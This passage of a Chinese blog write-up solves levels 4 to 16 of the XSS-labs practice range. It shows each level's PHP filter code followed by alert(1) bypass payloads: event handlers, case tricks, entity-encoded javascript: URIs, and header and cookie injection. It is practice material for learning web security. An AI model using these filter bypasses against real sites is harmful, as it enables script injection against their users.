alt="image-20240107173055574"><br>可以看到对&lt; &gt;进行了过滤<br>由下图可以看出是双引号包裹得<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173103900.png" alt="image-20240107173103900"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173112017.png" alt="image-20240107173112017"><br><strong>- Pass-5</strong><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173123212.png" alt="image-20240107173123212"><br>对script进行了过滤<br>看了下还是双引号包裹<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173132175.png" alt="image-20240107173132175"><br>过滤了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173141766.png" alt="image-20240107173141766"><br>看手源码<br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173149776.png" alt="image-20240107173149776"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;a href=&#x27;javascript:alert(1)&#x27;&gt;  </span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173201068.png" alt="image-20240107173201068"><br><strong>- Pass-6</strong><br>过滤</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp">$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><p>可大小写绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;Script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173213918.png" alt="image-20240107173213918"><br><strong>- Pass-7</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str =<span class="hljs-built_in">strtolower</span>( $_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str5);<br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&quot;&gt;&lt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173223378.png" alt="image-20240107173223378"><br><strong>- Pass-8</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br></code></pre></td></tr></table></figure><p>绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173251577.png" alt="image-20240107173251577"><br><strong>- Pass-9</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,$str4);<br>$str6=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,$str5);<br>$str7=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,$str6);<br>echo <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;?php</span><br><span class="hljs-string">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span>您的链接不合法？有没有！<span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;</span><span class="hljs-string">&#x27;.$str7.&#x27;</span><span class="hljs-string">&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">?&gt;</span><br><span class="hljs-string">&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;</span><br><span class="hljs-string">&lt;?php </span><br><span class="hljs-string">echo &quot;</span>&lt;h3 align=center&gt;payload的长度:<span class="hljs-string">&quot;.strlen($str7).&quot;</span>&lt;/h3&gt;<span class="hljs-string">&quot;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">java&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:<span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173303276.png" alt="image-20240107173303276"><br><strong>- Pass-10</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br>&lt;?php <br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.strlen(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>从代码中可以看到是有几个隐藏参数的如下构造</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/xss/level10.php?name=1&amp;keyword=1&amp;t_sort=%22type=%22text%22%20onclick=%22alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173311891.png" alt="image-20240107173311891"><br><strong>- Pass-11</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>显然只能从$str11&#x3D;$_SERVER[‘HTTP_REFERER’];入手了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173324529.png" alt="image-20240107173324529"><br><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173331677.png" alt="image-20240107173331677"><br><strong>- Pass-12</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>ini_set(<span class="hljs-string">&quot;display_errors&quot;</span>, 0);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173340796.png" alt="image-20240107173340796"></p><p>这个就是从user-agent入手</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span>alert(1)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173350266.png" alt="image-20240107173350266"><br><strong>- Pass-13</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">setcookie</span><span class="hljs-params">(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, time()+<span class="hljs-number">3600</span>)</span></span>;<br><span class="hljs-built_in">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br>$str = $_GET[<span class="hljs-string">&quot;keyword&quot;</span>];<br>$str00 = $_GET[<span class="hljs-string">&quot;t_sort&quot;</span>];<br>$str11=$_COOKIE[<span class="hljs-string">&quot;user&quot;</span>];<br>$str22=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str11);<br>$str33=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str22);<br>echo <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span><span class="hljs-number">.&#x27;</span>&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&#x27;.$str33.&#x27;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>cookie注入点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">user= <span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-built_in">alert</span>(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173406124.png" alt="image-20240107173406124"><br><strong>- Pass-14</strong><br>略<br><strong>- Pass-15</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = $_GET[<span class="hljs-string">&quot;src&quot;</span>];<br>echo <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-built_in">htmlspecialchars</span>($str)<span class="hljs-number">.&#x27;</span><span class="hljs-string">&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>注入代码</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-string">&#x27;level1.php?name=&lt;img src=x οnerrοr=alert(1)&gt;&#x27;</span><br></code></pre></td></tr></table></figure><p>因为这里要访问上面的angular.min.js这个js文件，才能进行包含，虚拟环境里面无法访问那个js，因为需要fanqiang才能访问<br>ng-include：相当于文件包含。用于包含外部的HTML文件，可以作为一个属性，或者一个元素使用</p><p>onerror:<br>οnerrοr&#x3D;handleErr</p><p>function handleErr(msg,url,l)<br>{<br>&#x2F;&#x2F;Handle the error here<br>return true or false<br>}</p><p><strong>- Pass-16</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;?<span class="hljs-function">php </span><br><span class="hljs-function"><span class="hljs-title">ini_set</span><span class="hljs-params">(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>)</span></span>;<br>$str = <span class="hljs-built_in">strtolower</span>($_GET[<span class="hljs-string">&quot;keyword&quot;</span>]);<br>$str2=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str);<br>$str3=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str2);<br>$str4=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str3);<br>$str5=<span class="hljs-built_in">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,$str4);<br>echo <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.$str5.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;<br>?&gt;<br></code></pre></td></tr></table></figure><p>换行符%0a（换行）或者%0d（回车）绕过</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">&lt;img%<span class="hljs-number">0</span>asrc=x%<span class="hljs-number">0</span>aonerror=<span class="hljs-string">&quot;alert(1)&quot;</span>&gt;<br><span class="hljs-comment">//src=#就会把后面的都注释掉了</span><br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107173415039.png" alt="image-20240107173415039"></p>]]></content>
    
    
    <categories>
